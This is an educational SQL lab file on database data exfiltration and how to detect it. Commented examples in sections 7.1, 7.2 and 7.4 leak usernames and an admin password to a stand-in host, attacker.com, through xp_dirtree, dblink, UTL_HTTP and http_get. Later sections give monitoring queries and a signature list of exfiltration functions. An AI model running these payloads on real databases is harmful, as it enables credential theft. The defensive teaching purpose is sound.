

## data_exfiltration.sql

```sql
-- ═══════════════════════════════════════════════════════════════
-- FLLC Lab 07: Data Exfiltration & Detection via SQL
-- Educational reference — know the attack to build the defense
-- ═══════════════════════════════════════════════════════════════

-- ═══════════════════════════════════════════════════════════════
-- 7.1  DNS-BASED EXFILTRATION (Concept)
-- ═══════════════════════════════════════════════════════════════

-- SQL Server: xp_dirtree forces DNS lookup
-- DECLARE @data VARCHAR(100) = (SELECT TOP 1 username FROM users);
-- EXEC master..xp_dirtree '\\' + @data + '.attacker.com\share';
-- DNS request to admin.attacker.com leaks the username

-- PostgreSQL: dblink to external server
-- SELECT * FROM dblink('host=attacker.com dbname=exfil', 'SELECT 1') AS t(col int);

-- DEFENSE: Outbound firewall rules, DNS monitoring, disable xp_dirtree

-- ═══════════════════════════════════════════════════════════════
-- 7.2  OUT-OF-BAND HTTP EXFILTRATION (Concept)
-- ═══════════════════════════════════════════════════════════════

-- Oracle: UTL_HTTP
-- SELECT UTL_HTTP.REQUEST('http://attacker.com/?d=' || 
--   (SELECT username FROM users WHERE ROWNUM=1)) FROM dual;

-- PostgreSQL: extension-based HTTP
-- SELECT content FROM http_get('http://attacker.com/?d=leaked_data');

-- DEFENSE: Network segmentation, no outbound from DB tier, revoke extension creation

-- ═══════════════════════════════════════════════════════════════
-- 7.3  SLOW DRIP EXFILTRATION DETECTION
-- ═══════════════════════════════════════════════════════════════

-- Detect unusual SELECT volume by user (anomaly baseline)
-- PostgreSQL with pg_stat_statements:
SELECT userid, query, calls, total_exec_time, rows
FROM pg_stat_statements
WHERE query ILIKE '%SELECT%'
ORDER BY rows DESC
LIMIT 20;

-- Detect bulk data access patterns:
SELECT usename, datname, query_start, state, query
FROM pg_stat_activity
WHERE state = 'active'
  AND query ILIKE '%SELECT%FROM%users%'
  AND query_start < NOW() - INTERVAL '5 seconds';

-- ═══════════════════════════════════════════════════════════════
-- 7.4  INLINE EXFIL VIA APPLICATION LAYER
-- ═══════════════════════════════════════════════════════════════

-- Attacker modifies visible fields to carry hidden data:
-- UPDATE products SET name = name || CHR(0) || 
--   (SELECT password FROM users WHERE username='admin')
-- WHERE id = 1;
-- 
-- Application displays "Network Scanner Pro" but hidden bytes carry the hash

-- DEFENSE: Output encoding validation, integrity checksums on critical fields

-- ═══════════════════════════════════════════════════════════════
-- 7.5  DETECTION QUERIES — REAL-TIME MONITORING
-- ═══════════════════════════════════════════════════════════════

-- Alert: More than 1000 rows accessed in single query
SELECT pid, usename, query_start, query
FROM pg_stat_activity
WHERE state = 'active'
  AND query_start < NOW() - INTERVAL '10 seconds';

-- Alert: Schema enumeration (information_schema access)
SELECT usename, query_start, query
FROM pg_stat_activity
WHERE query ILIKE '%information_schema%'
   OR query ILIKE '%pg_catalog%'
   OR query ILIKE '%sys.tables%'
   OR query ILIKE '%SHOW TABLES%';

-- Alert: Known exfil function signatures
SELECT usename, query
FROM pg_stat_activity
WHERE query ILIKE '%xp_dirtree%'
   OR query ILIKE '%utl_http%'
   OR query ILIKE '%dblink%'
   OR query ILIKE '%LOAD_FILE%'
   OR query ILIKE '%INTO OUTFILE%'
   OR query ILIKE '%INTO DUMPFILE%';

-- ═══════════════════════════════════════════════════════════════
-- 7.6  COMPLIANCE MAPPING
-- ═══════════════════════════════════════════════════════════════

-- NIST 800-53:
--   SC-7   Boundary Protection (network segmentation)
--   SC-28  Protection of Information at Rest (field encryption)
--   AU-6   Audit Review (anomaly detection queries)
--   SI-4   System Monitoring (real-time alerts)
--
-- PCI-DSS 4.0:
--   10.6   Review logs and security events
--   3.5    Protect stored account data
--
-- SOC 2:
--   CC6.6  Logical access security
--   CC7.2  System monitoring

```
